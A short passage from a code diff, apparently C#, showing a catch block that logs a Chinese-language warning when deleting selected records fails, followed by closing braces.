+                {
+                    log("删除选择记录失败！--" + ep.Message, LogLevel.waring);
+                }
+            }
+        }
     }
 }
